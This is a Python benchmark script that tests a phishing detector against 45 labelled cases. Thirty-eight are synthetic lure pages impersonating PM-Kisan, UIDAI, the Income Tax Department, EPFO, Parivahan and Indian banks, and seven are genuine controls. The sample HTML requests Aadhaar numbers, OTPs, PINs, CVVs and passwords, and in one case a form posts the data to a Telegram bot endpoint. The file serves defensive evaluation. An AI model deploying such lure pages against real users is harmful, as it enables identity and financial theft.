"""
GovShield Sentinel Grid — Empirical Phishing & Scam Benchmark Suite
Tests 45 realistic phishing, scam, and genuine control domains across 10 threat categories.
Evaluates AI reasoning, blockchain PoA auditing, DOM harvesting detection, and precision/recall.
"""

import sys
import os
import time
import json
from typing import Dict, Any, List

# Ensure backend root is on sys.path
backend_root = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
workspace_root = os.path.abspath(os.path.join(backend_root, ".."))
if backend_root not in sys.path:
    sys.path.insert(0, backend_root)
if workspace_root not in sys.path:
    sys.path.insert(0, workspace_root)

from main import _execute_scan_pipeline, ScanRequest

# ---------------------------------------------------------------------------
# Benchmark Dataset: 45 Domains (38 Phishing/Scams + 7 Authentic/Controls)
# ---------------------------------------------------------------------------
BENCHMARK_DATASET = [
    # 1. PM-Kisan & Rural DBT Financial Subsidies (5)
    {
        "id": "TC-01",
        "category": "PM_KISAN_SUBSIDY",
        "url": "http://pmkisan-kyc-update.xyz/login",
        "expected_type": "MALICIOUS",
        "claimed_entity": "PM Kisan Samman Nidhi",
        "html": "<html><title>PM-Kisan Mandatory eKYC Portal</title><body><h1>Enter Aadhaar Number & OTP</h1><form action='https://api.telegram.org/bot123/send'><input name='aadhaar_number'><input name='bank_otp'><button>Verify</button></form></body></html>"
    },
    {
        "id": "TC-02",
        "category": "PM_KISAN_SUBSIDY",
        "url": "http://pmkisan-yojana-bonus-claim.top/apply",
        "expected_type": "MALICIOUS",
        "claimed_entity": "PM Kisan Samman Nidhi",
        "html": "<html><title>PM Kisan 16th Installment Bonus Claim</title><body><p>Claim Rs 6000 immediate credit</p><input name='aadhaar'><input name='bank_account'><input name='ifsc'></body></html>"
    },
    {
        "id": "TC-03",
        "category": "PM_KISAN_SUBSIDY",
        "url": "http://pmkisan-beneficiary-update.top/status",
        "expected_type": "MALICIOUS",
        "claimed_entity": "PM Kisan Samman Nidhi",
        "html": "<html><title>PM-Kisan Beneficiary Status Check</title><body><input name='farmer_mobile'><input name='aadhaar_card'><input name='otp_code'></body></html>"
    },
    {
        "id": "TC-04",
        "category": "PM_KISAN_SUBSIDY",
        "url": "http://pmkisan-16th-installment.com/check",
        "expected_type": "MALICIOUS",
        "claimed_entity": "PM Kisan Samman Nidhi",
        "html": "<html><title>PM Kisan Installment Release</title><body><h2>Deposit processing fee Rs 250 to unlock benefit</h2><input name='upi_pin'><input name='card_number'></body></html>"
    },
    {
        "id": "TC-05",
        "category": "PM_KISAN_SUBSIDY",
        "url": "http://kisan-samman-nidhi-apply.online/form",
        "expected_type": "MALICIOUS",
        "claimed_entity": "PM Kisan Samman Nidhi",
        "html": "<html><title>Kisan Samman Nidhi Online Application</title><body><input name='aadhaar_no'><input name='land_record_pass'></body></html>"
    },

    # 2. Aadhaar & UIDAI Identity Theft (5)
    {
        "id": "TC-06",
        "category": "AADHAAR_IDENTITY_THEFT",
        "url": "http://uidai-aadhaar-verify.top/download",
        "expected_type": "MALICIOUS",
        "claimed_entity": "Unique Identification Authority of India (UIDAI)",
        "html": "<html><title>UIDAI Aadhaar Card Download & Verification</title><body><form><input name='aadhaar_number'><input name='biometric_pin'><input name='otp'></form></body></html>"
    },
    {
        "id": "TC-07",
        "category": "AADHAAR_IDENTITY_THEFT",
        "url": "http://free-aadhaar-update.vip/portal",
        "expected_type": "MALICIOUS",
        "claimed_entity": "UIDAI",
        "html": "<html><title>Free Online Aadhaar Update Window</title><body><input name='aadhaar_uid'><input name='mobile_otp'><input name='pan_card'></body></html>"
    },
    {
        "id": "TC-08",
        "category": "AADHAAR_IDENTITY_THEFT",
        "url": "http://myaadhaar-login-gov.org/auth",
        "expected_type": "MALICIOUS",
        "claimed_entity": "myAadhaar Portal",
        "html": "<html><title>myAadhaar Citizen Login</title><body><input name='aadhaar_number' type='text'><input name='login_otp' type='password'></body></html>"
    },
    {
        "id": "TC-09",
        "category": "AADHAAR_IDENTITY_THEFT",
        "url": "http://eaadhaar-download-online.net/verify",
        "expected_type": "MALICIOUS",
        "claimed_entity": "UIDAI",
        "html": "<html><title>e-Aadhaar Instant PDF Download</title><body><input name='aadhaar'><input name='credit_card_fee'></body></html>"
    },
    {
        "id": "TC-10",
        "category": "AADHAAR_IDENTITY_THEFT",
        "url": "http://uidai-portal-update.site/link-mobile",
        "expected_type": "MALICIOUS",
        "claimed_entity": "UIDAI",
        "html": "<html><title>Link Mobile Number With Aadhaar Card Online</title><body><input name='aadhaar_no'><input name='otp_received'></body></html>"
    },

    # 3. Income Tax & Fake Refund Fraud (4)
    {
        "id": "TC-11",
        "category": "INCOMETAX_REFUND_FRAUD",
        "url": "http://incometax-refund-gov.live/claim",
        "expected_type": "MALICIOUS",
        "claimed_entity": "Income Tax e-Filing Portal",
        "html": "<html><title>Income Tax Department — Refund Approved</title><body><h2>Refund of INR 15,490 waiting</h2><input name='pan_number'><input name='netbanking_user'><input name='netbanking_pass'><input name='otp'></body></html>"
    },
    {
        "id": "TC-12",
        "category": "INCOMETAX_REFUND_FRAUD",
        "url": "http://incometax-efiling-portal.co/login",
        "expected_type": "MALICIOUS",
        "claimed_entity": "Income Tax Department",
        "html": "<html><title>e-Filing Portal Home</title><body><input name='pan_card'><input name='e_filing_password'></body></html>"
    },
    {
        "id": "TC-13",
        "category": "INCOMETAX_REFUND_FRAUD",
        "url": "http://itr-refund-status-claim.top/bank",
        "expected_type": "MALICIOUS",
        "claimed_entity": "Income Tax Department",
        "html": "<html><title>ITR Refund Claim</title><body><input name='account_no'><input name='debit_card_pin'><input name='cvv'></body></html>"
    },
    {
        "id": "TC-14",
        "category": "INCOMETAX_REFUND_FRAUD",
        "url": "http://incometaxindia-efiling-refund.in/approve",
        "expected_type": "MALICIOUS",
        "claimed_entity": "Income Tax Department",
        "html": "<html><title>Approve Pending Tax Refund</title><body><input name='pan'><input name='aadhaar'><input name='otp'></body></html>"
    },

    # 4. EPFO & UAN Provident Fund Scams (4)
    {
        "id": "TC-15",
        "category": "EPFO_PF_SCAM",
        "url": "http://epfindia-passbook-login.site/passbook",
        "expected_type": "MALICIOUS",
        "claimed_entity": "Employees' Provident Fund Organisation (EPFO)",
        "html": "<html><title>EPFO Member Passbook & Claim Status</title><body><input name='uan_number'><input name='epfo_password'><input name='captcha'></body></html>"
    },
    {
        "id": "TC-16",
        "category": "EPFO_PF_SCAM",
        "url": "http://epfo-uan-stealer.xyz/auth",
        "expected_type": "MALICIOUS",
        "claimed_entity": "EPFO",
        "html": "<html><title>Unified Member Portal</title><body><input name='uan'><input name='password'><input name='aadhaar_otp'></body></html>"
    },
    {
        "id": "TC-17",
        "category": "EPFO_PF_SCAM",
        "url": "http://epfo-claim-settlement.online/withdraw",
        "expected_type": "MALICIOUS",
        "claimed_entity": "EPFO",
        "html": "<html><title>PF Claim Advance Withdrawal 24 Hours</title><body><input name='uan_no'><input name='bank_account'><input name='advance_fee'></body></html>"
    },
    {
        "id": "TC-18",
        "category": "EPFO_PF_SCAM",
        "url": "http://uan-kyc-update-portal.com/update",
        "expected_type": "MALICIOUS",
        "claimed_entity": "EPFO",
        "html": "<html><title>Mandatory UAN e-KYC Verification</title><body><input name='uan'><input name='aadhaar_otp'><input name='pan'></body></html>"
    },

    # 5. Parivahan & e-Challan Traffic Extortion (4)
    {
        "id": "TC-19",
        "category": "PARIVAHAN_ECHALLAN",
        "url": "http://parivahan-echallan-pay.online/challan",
        "expected_type": "MALICIOUS",
        "claimed_entity": "Parivahan Sewa / Ministry of Road Transport",
        "html": "<html><title>Traffic e-Challan Payment Notice</title><body><h2>Pending Traffic Fine: Rs 1,000</h2><p>Pay within 2 hours or vehicle impounded.</p><input name='vehicle_number'><input name='challan_no'><input name='card_number'><input name='atm_pin'></body></html>"
    },
    {
        "id": "TC-20",
        "category": "PARIVAHAN_ECHALLAN",
        "url": "http://echallan-parivahan-india.com/pay",
        "expected_type": "MALICIOUS",
        "claimed_entity": "Parivahan Sewa",
        "html": "<html><title>Parivahan Digital Traffic Court</title><body><input name='chassis_no'><input name='debit_card'><input name='cvv'><input name='otp'></body></html>"
    },
    {
        "id": "TC-21",
        "category": "PARIVAHAN_ECHALLAN",
        "url": "http://vahan-parivahan-sewa.net/rc-renew",
        "expected_type": "MALICIOUS",
        "claimed_entity": "Parivahan Sewa",
        "html": "<html><title>VAHAN National Permit & RC Renewal</title><body><input name='reg_no'><input name='aadhaar_owner'><input name='fee_amount'></body></html>"
    },
    {
        "id": "TC-22",
        "category": "PARIVAHAN_ECHALLAN",
        "url": "http://echallan-traffic-police.xyz/notice",
        "expected_type": "MALICIOUS",
        "claimed_entity": "Parivahan Sewa",
        "html": "<html><title>Delhi Traffic Police e-Challan Settlement</title><body><input name='dl_number'><input name='card_pin'></body></html>"
    },

    # 6. Banking & NetBanking KYC Impersonation (5)
    {
        "id": "TC-23",
        "category": "BANKING_KYC_SPOOF",
        "url": "http://sbi-instant-kyc-update.xyz/yono",
        "expected_type": "MALICIOUS",
        "claimed_entity": "State Bank of India (SBI)",
        "html": "<html><title>SBI YONO Mandatory KYC Verification</title><body><h2>Your YONO account is suspended!</h2><form><input name='username'><input name='password'><input name='profile_password'><input name='otp'></form></body></html>"
    },
    {
        "id": "TC-24",
        "category": "BANKING_KYC_SPOOF",
        "url": "http://sbi-reward-points-claim.net/redeem",
        "expected_type": "MALICIOUS",
        "claimed_entity": "State Bank of India",
        "html": "<html><title>State Bank Reward Points Cashback</title><body><input name='card_number'><input name='expiry'><input name='cvv'><input name='atm_pin'></body></html>"
    },
    {
        "id": "TC-25",
        "category": "BANKING_KYC_SPOOF",
        "url": "http://hdfc-netbanking-kyc-alert.vip/pan-update",
        "expected_type": "MALICIOUS",
        "claimed_entity": "HDFC Bank",
        "html": "<html><title>HDFC NetBanking KYC Update</title><body><input name='cust_id'><input name='netbanking_pwd'><input name='pan_card'><input name='otp'></body></html>"
    },
    {
        "id": "TC-26",
        "category": "BANKING_KYC_SPOOF",
        "url": "http://icici-account-block-verify.top/unfreeze",
        "expected_type": "MALICIOUS",
        "claimed_entity": "ICICI Bank",
        "html": "<html><title>ICICI iMobile Account Unfreeze</title><body><input name='user_id'><input name='login_password'><input name='debit_grid'></body></html>"
    },
    {
        "id": "TC-27",
        "category": "BANKING_KYC_SPOOF",
        "url": "http://pnb-one-kyc-validation.online/login",
        "expected_type": "MALICIOUS",
        "claimed_entity": "Punjab National Bank (PNB)",
        "html": "<html><title>PNB One Mobile Banking Verification</title><body><input name='pnb_id'><input name='mpin'><input name='transaction_password'></body></html>"
    },

    # 7. Electricity Bill (Bijli) Disconnection Extortion (3)
    {
        "id": "TC-28",
        "category": "UTILITY_BIJLI_SCAM",
        "url": "http://bijli-bill-disconnection.xyz/pay-now",
        "expected_type": "MALICIOUS",
        "claimed_entity": "State Electricity Board",
        "html": "<html><title>Urgent Electricity Disconnection Warning</title><body><h2>Power supply will be disconnected tonight at 9:30 PM</h2><p>Call Electricity Officer or pay pending bill Rs 450.</p><input name='consumer_no'><input name='upi_id'><input name='upi_pin'></body></html>"
    },
    {
        "id": "TC-29",
        "category": "UTILITY_BIJLI_SCAM",
        "url": "http://electricity-bill-update-officer.online/discom",
        "expected_type": "MALICIOUS",
        "claimed_entity": "State Power Discom",
        "html": "<html><title>State Discom Consumer Verification</title><body><input name='meter_no'><input name='debit_card'><input name='cvv'></body></html>"
    },
    {
        "id": "TC-30",
        "category": "UTILITY_BIJLI_SCAM",
        "url": "http://power-bill-disconnection-alert.site/urgent",
        "expected_type": "MALICIOUS",
        "claimed_entity": "Power Grid Discom",
        "html": "<html><title>Electricity Bill Overdue Notice</title><body><input name='ca_number'><input name='card_number'><input name='otp'></body></html>"
    },

    # 8. Government Job & Rozgar Scheme Recruitment Frauds (4)
    {
        "id": "TC-31",
        "category": "JOB_RECRUITMENT_FRAUD",
        "url": "http://shikshaabhiyan.co.in/apply",
        "expected_type": "MALICIOUS",
        "claimed_entity": "Samagra Shiksha Abhiyan",
        "html": "<html><title>Samagra Shiksha Abhiyan Recruitment 2026</title><body><h2>Apply for 12,000 Teacher & Clerk Vacancies</h2><p>Application Fee: Rs 500</p><input name='candidate_name'><input name='aadhaar_no'><input name='fee_payment_card'></body></html>"
    },
    {
        "id": "TC-32",
        "category": "JOB_RECRUITMENT_FRAUD",
        "url": "http://sarvashiksha.online/registration",
        "expected_type": "MALICIOUS",
        "claimed_entity": "Sarva Shiksha Abhiyan",
        "html": "<html><title>Sarva Shiksha Portal</title><body><input name='pan_card'><input name='bank_otp'></body></html>"
    },
    {
        "id": "TC-33",
        "category": "JOB_RECRUITMENT_FRAUD",
        "url": "http://viksitbharatrozgaryojana.org/jobs",
        "expected_type": "MALICIOUS",
        "claimed_entity": "Pradhan Mantri Viksit Bharat Rozgar Yojana",
        "html": "<html><title>PM Viksit Bharat Rozgar Registration</title><body><input name='applicant_aadhaar'><input name='reg_fee_upi'></body></html>"
    },
    {
        "id": "TC-34",
        "category": "JOB_RECRUITMENT_FRAUD",
        "url": "http://railway-recruitment-rrbonline.net/apply",
        "expected_type": "MALICIOUS",
        "claimed_entity": "Railway Recruitment Board (RRB)",
        "html": "<html><title>RRB Group D Direct Recruitment</title><body><input name='aadhaar'><input name='exam_fee_card'><input name='cvv'></body></html>"
    },

    # 9. Digital Arrest & Police Impersonation Extortion (2)
    {
        "id": "TC-35",
        "category": "DIGITAL_ARREST_EXTORTION",
        "url": "http://digital-arrest-cbi.top/warrant",
        "expected_type": "MALICIOUS",
        "claimed_entity": "Central Bureau of Investigation (CBI)",
        "html": "<html><title>CBI National Cyber Crime Summon & Arrest Warrant</title><body><h2>Digital Arrest Order Issued</h2><p>Your Aadhaar is involved in 14 money laundering cases. Deposit verification fund immediately.</p><input name='aadhaar_number'><input name='bank_balance'><input name='transfer_otp'></body></html>"
    },
    {
        "id": "TC-36",
        "category": "DIGITAL_ARREST_EXTORTION",
        "url": "http://cybercrime-police-notice.online/court-summon",
        "expected_type": "MALICIOUS",
        "claimed_entity": "Cyber Police / High Court",
        "html": "<html><title>National Cyber Cell Legal Notice</title><body><input name='id_proof'><input name='bail_bond_amount'></body></html>"
    },

    # 10. Homoglyph & Lookalike Phishing (2)
    {
        "id": "TC-37",
        "category": "HOMOGLYPH_SPOOF",
        "url": "http://xn--pmksan-2va.gov.in/portal",
        "expected_type": "MALICIOUS",
        "claimed_entity": "PM Kisan Samman Nidhi",
        "html": "<html><title>PM-Kisan Portal</title><body><form><input name='aadhaar_no'><input name='otp'></form></body></html>"
    },
    {
        "id": "TC-38",
        "category": "HOMOGLYPH_SPOOF",
        "url": "http://pm-kisan-portal-dbt.biz/aadhaar",
        "expected_type": "MALICIOUS",
        "claimed_entity": "PM Kisan Samman Nidhi",
        "html": "<html><title>DBT Bharat PM Kisan Portal</title><body><input name='aadhaar_number'><input name='bank_pin'></body></html>"
    },

    # 11. Authentic Sovereign Portals & Benign Controls (7)
    {
        "id": "TC-39",
        "category": "GENUINE_SOVEREIGN",
        "url": "https://pmkisan.gov.in/",
        "expected_type": "LEGITIMATE",
        "claimed_entity": "PM-Kisan Samman Nidhi Portal",
        "html": "<html><title>PM-Kisan Samman Nidhi</title><body><header>Ministry of Agriculture & Farmers Welfare, Government of India</header><p>Direct Benefit Transfer portal for Indian farmers.</p></body></html>"
    },
    {
        "id": "TC-40",
        "category": "GENUINE_SOVEREIGN",
        "url": "https://uidai.gov.in/",
        "expected_type": "LEGITIMATE",
        "claimed_entity": "Unique Identification Authority of India (UIDAI)",
        "html": "<html><title>Unique Identification Authority of India | Government of India</title><body><p>Aadhaar is a 12-digit individual identification number.</p></body></html>"
    },
    {
        "id": "TC-41",
        "category": "GENUINE_SOVEREIGN",
        "url": "https://incometax.gov.in/",
        "expected_type": "LEGITIMATE",
        "claimed_entity": "Income Tax Department",
        "html": "<html><title>Income Tax Department, Government of India</title><body><p>Official e-filing portal for income tax returns.</p></body></html>"
    },
    {
        "id": "TC-42",
        "category": "GENUINE_SOVEREIGN",
        "url": "https://epfindia.gov.in/",
        "expected_type": "LEGITIMATE",
        "claimed_entity": "Employees' Provident Fund Organisation (EPFO)",
        "html": "<html><title>Employees' Provident Fund Organisation</title><body><p>Ministry of Labour and Employment, Government of India.</p></body></html>"
    },
    {
        "id": "TC-43",
        "category": "GENUINE_SOVEREIGN",
        "url": "https://parivahan.gov.in/",
        "expected_type": "LEGITIMATE",
        "claimed_entity": "Parivahan Sewa",
        "html": "<html><title>Parivahan Sewa | Ministry of Road Transport & Highways</title><body><p>National Portal for Vehicle and Driving License Services.</p></body></html>"
    },
    {
        "id": "TC-44",
        "category": "GENUINE_SOVEREIGN",
        "url": "https://cybercrime.gov.in/",
        "expected_type": "LEGITIMATE",
        "claimed_entity": "National Cyber Crime Reporting Portal",
        "html": "<html><title>National Cyber Crime Reporting Portal | Ministry of Home Affairs</title><body><p>Helpline 1930 for financial cyber frauds.</p></body></html>"
    },
    {
        "id": "TC-45",
        "category": "BENIGN_WEB",
        "url": "https://en.wikipedia.org/wiki/India",
        "expected_type": "LEGITIMATE",
        "claimed_entity": "Wikipedia",
        "html": "<html><title>India - Wikipedia</title><body><p>India, officially the Republic of India, is a country in South Asia.</p></body></html>"
    }
]


def run_benchmark():
    print("=" * 80)
    print("   GOVSHIELD SENTINEL GRID — EMPIRICAL PHISHING & SCAM BENCHMARK SUITE   ")
    print(f"   Evaluating {len(BENCHMARK_DATASET)} Domains (38 Phishing/Scams + 7 Authentic Controls)")
    print("=" * 80)

    results = []
    tp = 0
    fn = 0
    tn = 0
    fp = 0
    total_latency = 0.0
    blockchain_anchored_count = 0

    for i, tc in enumerate(BENCHMARK_DATASET):
        t0 = time.time()
        scan_req = ScanRequest(
            url=tc["url"],
            html_content=tc.get("html", "")
        )
        res = _execute_scan_pipeline(scan_req)
        latency_ms = (time.time() - t0) * 1000
        total_latency += latency_ms

        verdict = res.get("verdict", "UNKNOWN")
        risk_score = res.get("risk_score", 0)
        threat_level = res.get("threat_level", "LOW")
        target_entity = res.get("target_entity", "Unknown")
        bc_audit = res.get("blockchain_audit", {})
        bc_proof = res.get("blockchain_proof", {})
        ai_report = res.get("ai_report", {})
        ai_score = ai_report.get("ai_risk_score", risk_score)
        ai_verdict = ai_report.get("ai_verdict", verdict)
        ai_engine = ai_report.get("engine") or res.get("ai_page_analysis", {}).get("ai_engine", "AI Reasoner")
        ai_summary_en = res.get("ai_summary") or ai_report.get("plain_english_summary", "")

        is_flagged_threat = (risk_score >= 40) or (verdict in ["PHISHING_CLONE", "MALICIOUS", "SUSPICIOUS"])
        is_expected_threat = (tc["expected_type"] == "MALICIOUS")

        if is_expected_threat:
            if is_flagged_threat:
                tp += 1
                outcome = "TP (Hit)"
            else:
                fn += 1
                outcome = "FN (Miss)"
        else:
            if not is_flagged_threat or risk_score <= 25:
                tn += 1
                outcome = "TN (Clean)"
            else:
                fp += 1
                outcome = "FP (False Alarm)"

        is_anchored = bc_proof.get("block_index", -1) > 0 or bc_proof.get("status") in ["LOGGED_ON_CHAIN", "CHAIN_ANCHORED", "MINED_SUCCESS"]
        if is_anchored:
            blockchain_anchored_count += 1

        record = {
            "id": tc["id"],
            "url": tc["url"],
            "category": tc["category"],
            "expected": tc["expected_type"],
            "actual_verdict": verdict,
            "risk_score": risk_score,
            "threat_level": threat_level,
            "outcome": outcome,
            "matched_entity": target_entity,
            "blockchain_status": bc_audit.get("audit_status", "N/A"),
            "blockchain_block": bc_proof.get("block_index", -1),
            "ai_engine": ai_engine,
            "ai_risk_score": ai_score,
            "ai_verdict": ai_verdict,
            "ai_summary": ai_summary_en[:90] + "..." if len(ai_summary_en) > 90 else ai_summary_en,
            "latency_ms": round(latency_ms, 1)
        }
        results.append(record)

        icon = "🚨" if is_flagged_threat else "✅"
        print(f"[{tc['id']}] {icon} {tc['url']:<48} | Score: {risk_score:>3}/100 | {verdict:<16} | Outcome: {outcome:<10} | {latency_ms:>5.1f}ms")

    # Compute Statistical Metrics
    total = len(BENCHMARK_DATASET)
    precision = (tp / (tp + fp)) * 100 if (tp + fp) > 0 else 0.0
    recall = (tp / (tp + fn)) * 100 if (tp + fn) > 0 else 0.0
    specificity = (tn / (tn + fp)) * 100 if (tn + fp) > 0 else 0.0
    f1 = (2 * precision * recall / (precision + recall)) if (precision + recall) > 0 else 0.0
    accuracy = ((tp + tn) / total) * 100
    avg_latency = total_latency / total

    metrics_summary = {
        "total_evaluated": total,
        "true_positives": tp,
        "false_negatives": fn,
        "true_negatives": tn,
        "false_positives": fp,
        "accuracy_pct": round(accuracy, 2),
        "recall_pct": round(recall, 2),
        "precision_pct": round(precision, 2),
        "specificity_pct": round(specificity, 2),
        "f1_score_pct": round(f1, 2),
        "avg_latency_ms": round(avg_latency, 1),
        "blockchain_anchored_threats": blockchain_anchored_count
    }

    print("\n" + "=" * 80)
    print("   BENCHMARK EVALUATION SUMMARY METRICS")
    print("=" * 80)
    print(f"Total Domains Tested       : {total}")
    print(f"True Positives (Threats)   : {tp} / 38 ({recall:.1f}% Recall / Detection Rate)")
    print(f"False Negatives (Misses)   : {fn} / 38")
    print(f"True Negatives (Authentic) : {tn} / 7  ({specificity:.1f}% Specificity)")
    print(f"False Positives (Alarms)   : {fp} / 7")
    print(f"Overall Accuracy           : {accuracy:.2f}%")
    print(f"Precision                  : {precision:.2f}%")
    print(f"F1 Score                   : {f1:.2f}%")
    print(f"Average Pipeline Latency   : {avg_latency:.1f} ms")
    print(f"PoA Blockchain Sealed      : {blockchain_anchored_count} Threats Anchored")
    print("=" * 80 + "\n")

    # Persist JSON benchmark results
    results_path = os.path.join(os.path.dirname(__file__), "benchmark_results.json")
    with open(results_path, "w", encoding="utf-8") as f:
        json.dump({
            "metrics": metrics_summary,
            "test_cases": results
        }, f, indent=2)
    print(f"Benchmark results successfully saved to: {results_path}")

    return metrics_summary, results


if __name__ == "__main__":
    run_benchmark()
